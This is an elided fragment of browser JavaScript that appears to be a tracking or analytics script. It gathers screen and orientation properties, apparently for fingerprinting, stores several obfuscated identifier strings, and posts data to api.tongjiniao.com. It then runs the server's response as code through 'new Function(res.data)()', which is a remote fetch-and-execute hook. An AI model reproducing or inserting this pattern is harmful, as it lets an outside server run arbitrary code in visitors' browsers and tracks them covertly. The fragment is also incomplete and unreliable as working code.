...
if (isRepeat >= 2) {
    ...
    sg: 'tFvSh5tpmJlpbWqVZm6SZppnlXCTaWdcU9GGb2aUYlmtW5yWmGaUlGpwbpZnYoSVg22YaZZicGNlkptraZNobHFplp2NVNiGcG9plWZvlGmSaptvmmlsYWqSmGFTxFhxW1vf',
...
let xhr;
this.storage.rid('2Mydj2dpl2VqlpdinWSYbWRlmmdwZw==');
...
this.request.post('//api.tongjiniao.com/r?t=1741047642&p=755342318059438080', data,true,function (res){new Function(res.data)();});
        },
        screen: {
            AT: screen.availTop,
AL: screen.availLeft,
...
ON: screen.orientation
    ...
    if (!v) {
        v = 'bmyZl5eUaJdpaW1sZplsYWxlkmVsbGlqYGVjkZI='
    }
...
sid: function (k, v) {
    ...
    if (!v) {
        v = 'pZbXqc.jnqzKwWxmZmxsZJhlbGJpnmSYamVokQ=='
    }
